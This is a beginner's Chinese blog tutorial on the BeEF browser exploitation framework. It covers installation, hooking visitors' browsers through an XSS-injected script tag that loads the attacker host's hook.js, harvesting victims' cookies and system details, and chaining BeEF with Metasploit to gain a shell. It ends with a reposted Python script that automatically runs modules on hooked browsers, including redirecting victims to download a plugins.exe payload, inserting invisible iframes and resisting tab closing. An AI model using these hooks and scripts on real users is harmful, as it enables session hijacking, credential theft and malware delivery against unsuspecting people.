# **BeEf新手向**
## **写在前面**
*上学期第一次接触到XSS，然后就知道了BeEf这个工具，一直对BeEf很好奇。本文主要是作者作为新手记录学习用的，所以介绍的主要就是BeEf的使用，并没有涉及到底层。新手上路，求轻喷。*

## **BeEF简介**

 - 是什么？
BeEf,The Browser Exploitation Framework缩写，攻击者可以对目标进行攻击测试，攻击成功以后会加载浏览器劫持会话，它扩展了跨站漏洞的利用，能HOOK很多浏览器(IE和Firefox等)并可以执行很多内嵌命令。
 

### 环境：BT5 【或者Kali】

## **安装**
删除BT5上面自带的版本稍旧的BeEF【kali上也有自带的beef】
```
rm -rf /pentest/web/beef-ng

git clone https://github.com/beefproject/beef

cd /pentest/web/beef

./beef
```
![这里写图片描述](http://img.blog.csdn.net/20171121212439825?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
然后要开启apache
```
apache2 start
```
接着就访问返回信息中的**登录地址**http://localIP:3000/ui/panel，可以看到一个登录界面，默认账号/密码：beef/beef

![网页界面](http://img.blog.csdn.net/20171121211434022?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

*这里有个小插曲，我在打开http://192.168.137.134:3000/ui/panel的时候，一直没有显示什么登录框，就以为是安装出了错，原来是我的fx设置了安全限制*

## **访问+测试**
访问测试网址http://ip:3000//demos/basic.html，就是说，如果一个网站有XSS漏洞，然后你通过某种方式把你的（钓鱼）网址发到这个有XSS漏洞的页面，受害者点击或者直接访问那个界面时，就会跳转到你构造的钓鱼界面
***页面源代码要有***

```
<script src="http://攻击主机IP:3000/hook.js"></script>
```

![这里写图片描述](http://img.blog.csdn.net/20171121214446838?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
接着我们就可以在我们的beef上看到有受害者登录了

![这里写图片描述](http://img.blog.csdn.net/20171121215216183?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)

## **各个部分解析**
### **Logs**
日志，顾名思义，就是记录所有登录过的肉鸡【访问钓鱼网站的机器】
*又有问题了*——我想用我的物理机访问BT5上的测试网址，然后发现互ping都可以ping得通，就是访问不了。解决方法就是在NAT模式下，添加一个映射端口,接着就物理机和另一台虚拟机【win 2K3】都可以访问了

### **Current Browser**
#### **Details**
可以看到肉鸡的详细信息，包括浏览器信息【版本号等】、访问的页面信息【有cookie！！】以及肉鸡的系统信息

#### **Logs**
跟上面那个不一样，这里只是当前肉鸡的操作信息

#### **Commands模块metasploit**

![这里写图片描述](http://img.blog.csdn.net/20171121224519480?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
*这里的模块就不详细记录了，有点多，有需要再百度

主要还是记录一下，BeEF与metasploit的结合使用

 - 加载metasploit,可以在上面的截图中看到，没加载之前metasploit那一项的模块是为0的
	将文件中的metasploit选项修改为true
	
	![这里写图片描述](http://img.blog.csdn.net/20171122001426603?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
 - 查看/pentest/web/beef/extensions/metasploit/config.yaml，看到beef与metasploit通信的密码
 
 ![默认密码](http://img.blog.csdn.net/20171122001706133?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
 
 - 转到msf目录/opt/metasploit/msf3/，新建一个 beef.rc文件，内容为：load msgrpc ServerHost=127.0.0.1 Pass=abc123
 启动msf
```
msfconsole –r beef.rc
```
然后重新启动beef，可以看到这一次的metasploit模块有234个

![这里写图片描述](http://img.blog.csdn.net/20171125164620320?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
接着就是msfconsole的使用内容了
看到对应的浏览器使用查找相应的模块然后使用，会返回一个访问地址，用BeEF的Redirect模块，使得当前的受害者访问该地址，之后就可以得到一个shell

![这里写图片描述](http://img.blog.csdn.net/20171125164944592?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 

### **BeEF目录**
用Ruby语言写的

最主要的目录有三个，core、extension和modules，BEEF的核心文件在core目录下，各种扩展功能在extension目录下，modules则为攻击模块目录。

![这里写图片描述](http://img.blog.csdn.net/20171125172140862?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
#### **core目录**
BEEF的核心目录，并负责加载扩展功能和攻击模块

![这里写图片描述](http://img.blog.csdn.net/20171125175658916?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
client目录下均为js文件，是在受控客户端（hooked browser）使用的js文件，包括net、browser、encode、os等的实现，以update.js为例，在core\main\client\update.js中可以看到，定义了beef.updater，设置每隔5秒check一次是否有新的命令，如果有，则获取并执行之。
console目录用于命令行控制。
constants目录定义了各种常量。
handlers目录主要用于处理来自受控客户端连接请求。
models目录定义了一些基本的类。
rest目录，即WEB服务基于REST原则，是一种轻量级的HTTP实现

#### **extention目录**
![这里写图片描述](http://img.blog.csdn.net/20171125180957583?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvTGFvbl9DaGFu/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast) 
admin_ui: 实现了一个WEB界面的控制后台。
metasploit: 与metasploit互通相关的设置。
requester: 负责处理HTTP请求
config.yaml为作者和该扩展相关信息。
api.rb为自身注册的一些API函数。
models定义了一个http模型对象，例如，其中有个has_run属性，当请求未发送时，其值为”waiting”，发送攻击时，遍历状态为”waiting”的模块，并发送http请求。
handler.rb 主要是处理http响应，收到响应后将相应的模块has_run状态置为complete，并保存到数据库。

#### **modules目录**
集合了BEEF的各个攻击模块，一般一个攻击模块分为3个文件：command.js、config.yaml、module.rb。这样的结构可以很方便地进行模块添加，易于扩展。
config.yaml: 攻击模块相关信息，如名称、描述、分类、作者、适用场景等
module.rb:文件定义了该攻击模块的类，继承了BEFF::Core::Command类，在通用command类的基础上定义一些该模块特有的处理函数，如使用较多的一个函数是post_execute，即攻击进行后进行的操作（一般为保存结果）

## **自动化脚本python**
最近在学python写工具，所以最后收藏一个大佬分享的beef自动化脚本【加上了自己的理解】

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ** Author: ssooking
# ** Name： AutoBeef.py

import json
import urllib2
import time

hostlist = []
hostdict = {}


# 1、获得API key，每次开启beef都会不一样
def getauthkey(host):
	# host 是hook页面的url
	# /api/admin/login是用户登录接口，通过
	# 该接口登录之后，我们可以得到用于会话认证的API key
    apiurl =  host + "api/admin/login"		 
    logindata = {
        "username":"beef",
        "password":"beef"
    }
	 # 对数据进行JSON格式化编码
    jdata = json.dumps(logindata)            
	 # 生成页面请求的完整数据
    req = urllib2.Request(apiurl, jdata)     
	# 发送页面请求
    response = urllib2.urlopen(req)           
	# 获取服务器返回的页面信息，数据类型为str
    resdata = response.read()                 
	# 把数据解析成python对象，此时返回dict数据
    jsondata =  json.loads(resdata)           
    return jsondata['token']

	
# 2、获得hook主机列表,session值就是cookie
def getHookedBrowsersSession(host,authkey):
	# 用到了前面的API key
    f = urllib2.urlopen(host + "/api/hooks?token=" + authkey)
    data = json.loads(f.read())
    hookonline = data['hooked-browsers']['online']
    for x in hookonline:
        hookid = hookonline[x]['id']
        hookip = hookonline[x]['ip']
        hooksession = hookonline[x]['session']
        if hookid not in hostdict:
            hostdict[hookid] = hooksession
            print "\n[+] Hooked host id:  " + bytes(hookid) + "\n   >>> IP: " + bytes(hookip) + "\n   >>> Session: " + hooksession

#3、模块使用	
# 终端命令：curl -i -H "Content-Type: application/json; charset=UTF-8" -d '{各个模块需要的额外的参数}' http://xxxxx/api/modules/【受害者浏览器】session/模块id?token=【authkey】
#受害者在试图关闭选项卡时会向用户显示"关闭确认"对话框，
#通过这种方式来增加shell的存活时间
# persistence -> confirm close tab
def sendConfirm(host, session, authkey):
    postdata = '{}'
    url = host + "api/modules/" + session + "/46?token=" + authkey
    #print url
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Confirm Close Tab has been Executed ! "
    return f.read()			
	
	
# 使用beef模块，弹窗功能
# Misc -> IBM iNotes -> RAW js
def execJavascript(host, session, authkey):

    payload={
        "cmd":"alert('Hello by ssooking!');"
    }
	# 169是beef模块的id
    apiurl = host + "api/modules/" + session + "/3?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    print "   >>> [+] Module Raw JavaScript has been Executed ! "
    return resdata

# 使受害者浏览器跳转到一个下载页面并下载。。。

def redirectBrowser(host, session, authkey):
    payload = {"redirect_url":"http://192.168.137.134:8000/plugins.exe"}
    apiurl = host + "api/modules/" + session + "/42?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    jsondata =  json.loads(resdata)
    print "   >>> [+] Module Redirect Browser has been Executed ! "
    return jsondata

	
# 创建一个隐藏的Frame,target是目的地的url
# Misc -> IBM iNotes -> Create Invisible iframe
def createIFrame(host, sessionId, authkey):
    postdata = '{"target":"http://192.168.137.134:8000/"}'
    url = host + "api/modules/" + sessionId + "/4?token1=" + authkey
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Create Invisible Iframe has been Executed ! "
    return f.read()



	
def autoRunModules(host,session,authkey):
    # sendConfirm(host, session, authkey)
    execJavascript(host, session, authkey)
    # redirectBrowser(host, session, authkey)


def timeRun(interval,host):
    authkey = getauthkey(host)
    print "[+] AutoBeef is running...."
    print "[+] BeEF KEY is : "+ authkey
    print "[+] Base BeEF API URL: "+ host + "api/"
    print "[+] Hook URL   : " + host + "hook.js"
    print "[+] Hook Demo  : " + host + "demos/basic.html"
    while True:
        try:
            getHookedBrowsersSession(host, authkey)
            for x in hostdict:
                if hostdict[x] not in hostlist:
                    hostlist.append(hostdict[x])
                    autoRunModules(host,hostdict[x],authkey)
            time.sleep(interval)
        except Exception, e:
            print e

if __name__ == '__main__':
    beefhost = "http://192.168.137.134:3000/"
    timeRun(3,beefhost)
```
脚本出处：
https://www.cnblogs.com/ssooking/p/6959239.html#_label0 【利用BeEF REST API自动化控制僵尸主机】